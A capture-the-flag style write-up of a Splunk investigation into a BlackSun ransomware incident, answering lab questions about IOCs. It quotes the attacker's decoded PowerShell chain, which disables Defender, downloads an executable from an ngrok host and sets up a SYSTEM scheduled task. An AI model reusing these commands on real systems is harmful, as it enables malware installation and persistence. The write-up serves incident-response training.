# Investigating a Ransomware Incident Using Splunk — BlackSun Ransomware

## Scenario

As a SOC Analyst for the MSSP **TryNotHackMe**, a customer requested an investigation into events on **Keegan's machine** on **Monday, May 16th, 2022**. The machine remained operational, but several files had been renamed with an unfamiliar file extension — raising concern that a ransomware attempt had occurred.

The objective was to use Splunk to reconstruct the attack chain, identify indicators of compromise (IOCs), and confirm the ransomware strain involved.

---

## Q1: A suspicious binary was downloaded to the endpoint. What was its name?

Starting from a base search scoped to the incident date:

```spl
index=main
```

The time range was set to **Monday, May 16th, 2022**, returning **4,921** events.

Inspecting the `CommandLine` field surfaced an obfuscated, Base64-encoded PowerShell execution:

```
powershell.exe -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7...
```

Decoding this payload revealed the following commands:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true;
wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;
SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\OUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f
SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
```

This single command chain performs several actions:

1. **Disables Microsoft Defender's real-time monitoring**, lowering the host's detection capability.
2. **Downloads an executable** (`OUTSTANDING_GUTTER.exe`) from an **ngrok tunnel** — a service commonly abused by attackers to expose temporary, disposable infrastructure to the internet — and saves it to `C:\Windows\Temp`.
3. **Creates an event-triggered scheduled task** configured to run as `SYSTEM`, firing whenever **Event ID 777** appears in the Windows Application log.
4. **Immediately runs the scheduled task**, executing the payload with elevated privileges.

This is a classic **event-triggered scheduled task persistence** technique — a stealthy, "living-off-the-land" (LOLBIN) method that blends malicious persistence into normal Windows task scheduling.

**Answer:** `OUTSTANDING_GUTTER.exe`

---

## Q2: What address was the binary downloaded from? (defanged, with `http://`)

Extracted directly from the decoded command in Q1 and defanged using CyberChef:

**Answer:** `hxxp[://]886e-181-215-214-32[.]ngrok[.]io`

---

## Q3: What Windows executable was used to download the suspicious binary? (full path)

Since PowerShell initiated the download, the `ParentCommandLine` field was inspected to confirm the full binary path:

**Answer:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

---

## Q4: What command configured the binary to run with elevated privileges?

From the decoded payload in Q1, the scheduled task creation command:

```
"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\OUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f
```

---

## Q5: What permissions does the binary run as, and what command runs it with elevated privileges?

**(Format: User; CommandLine)**

As established in Q1, the scheduled task was configured to run under the `SYSTEM` account and executed via:

**Answer:**
```
NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe
```

---

## Q6: The binary connected to a remote server. What address did it connect to? (defanged, with `http://`)

```spl
index=main "OUTSTANDING_GUTTER.exe"
```

This returned **325** events. Reviewing the `Message` field for DNS query activity revealed:

```
Dns query:
RuleName: -
UtcTime: 2022-05-16 13:34:24.030
ProcessGuid: {eea302a0-52df-6282-180f-000000000300}
ProcessId: 8544
QueryName: 9030-181-215-214-32.ngrok.io
QueryStatus: 0
QueryResults: ::ffff:3.134.125.175;
Image: C:\Windows\Temp\OUTSTANDING_GUTTER.exe
User: NT AUTHORITY\SYSTEM
```

This confirms `OUTSTANDING_GUTTER.exe`, running as `SYSTEM`, made a DNS query for a second ngrok domain — distinct from the download source — indicating a separate C2 callback channel.

**Answer:** `hxxp[://]9030-181-215-214-32[.]ngrok[.]io`

---

## Q7: A PowerShell script was downloaded to the same location as the binary. What was its filename?

The binary's save path was `C:\Windows\Temp\OUTSTANDING_GUTTER.exe`. Searching for `.ps1` files in the same index:

```spl
index=main "*.ps1"
```

This returned **16** events. The `TargetFilename` field revealed several PowerShell script policy test artifacts alongside one standout file:

```
C:\Users\keegan\AppData\Local\Temp\__PSScriptPolicyTest_1drcoyjc.fn3.ps1
C:\Users\keegan\AppData\Local\Temp\__PSScriptPolicyTest_gv2h0id4.yub.ps1
C:\Users\keegan\AppData\Local\Temp\__PSScriptPolicyTest_ocwzia2g.yzb.ps1
C:\Windows\Temp\__PSScriptPolicyTest_3mhxqum0.fcl.ps1
C:\Windows\Temp\__PSScriptPolicyTest_nxbdg4vz.swp.ps1
C:\Windows\Temp\__PSScriptPolicyTest_rmlwvvw4.wdu.ps1
C:\Windows\Temp\__PSScriptPolicyTest_znwpkv32.osj.ps1
C:\Windows\Temp\script.ps1
```

The `__PSScriptPolicyTest_*` files are benign artifacts generated by PowerShell's script execution policy checks. The outlier — `script.ps1`, saved directly in `C:\Windows\Temp` alongside the malicious binary — stands out as the suspicious file.

**Answer:** `script.ps1`

---

## Q8: The malicious script was flagged as malicious. What was its actual (original) name?

To identify the script's true identity, I pivoted on `script.ps1` and extracted its file hashes:

```spl
index=main "*.ps1" TargetFilename="C:\\Windows\\Temp\\script.ps1"
```

This returned **2** events. Expanding the first event exposed the file's **SHA1, MD5, and SHA256** hashes.

Submitting the hash to **VirusTotal** revealed the following associated filenames:

```
BlackSun.ps1
e5429f2e44990b3d4e249c566fbf19741e671c0e40b809f87248d9ec9114bef9.ps1
523.mal
```

Per the expected answer format, the original/common name is used:

**Answer:** `BlackSun.ps1`

---

## Q9: A ransomware note was saved to disk as an IOC. What is its full path?

VirusTotal's popular threat label for the hash confirmed the malware family:

```
ransomware.blacksun/powershell
```

Since ransom notes are typically plain text files, I searched for `.txt` artifacts:

```spl
index=main "*.txt"
```

This returned **2** events. The `TargetFilename` field in the first event revealed:

**Answer:** `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt`

---

## Q10: An image file was saved to replace the desktop wallpaper as an IOC. What is its full path?

Searching for common image file extensions:

```spl
index=main "*.png" OR "*.jpeg" OR "*.jpg" OR "*.img"
```

This returned **3** events, with the following files identified in the `TargetFilename` field:

```
C:\Users\Public\Pictures\blacksun.jpg
C:\Users\keegan\AppData\Local\Microsoft\OneDrive\22.077.0410.0007\Microsoft.SharePoint.png
```

The first file is clearly tied to the BlackSun campaign and located in a shared, publicly-accessible user profile path — consistent with a wallpaper-replacement ransom technique. The second is a legitimate OneDrive application asset.

**Answer:** `C:\Users\Public\Pictures\blacksun.jpg`

---

## Summary

| # | Finding |
|---|---------|
| Malicious binary | `OUTSTANDING_GUTTER.exe` |
| Download source | `hxxp[://]886e-181-215-214-32[.]ngrok[.]io` |
| Delivery mechanism | PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) |
| Persistence technique | Event-triggered scheduled task (Event ID 777 → run as SYSTEM) |
| Privilege escalation command | `schtasks.exe /Run /TN OUTSTANDING_GUTTER.exe` as `NT AUTHORITY\SYSTEM` |
| C2 callback domain | `hxxp[://]9030-181-215-214-32[.]ngrok[.]io` |
| Dropped PowerShell script | `script.ps1` |
| Script's true identity (VirusTotal) | `BlackSun.ps1` |
| Ransomware family | BlackSun (`ransomware.blacksun/powershell`) |
| Ransom note path | `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt` |
| Wallpaper IOC path | `C:\Users\Public\Pictures\blacksun.jpg` |
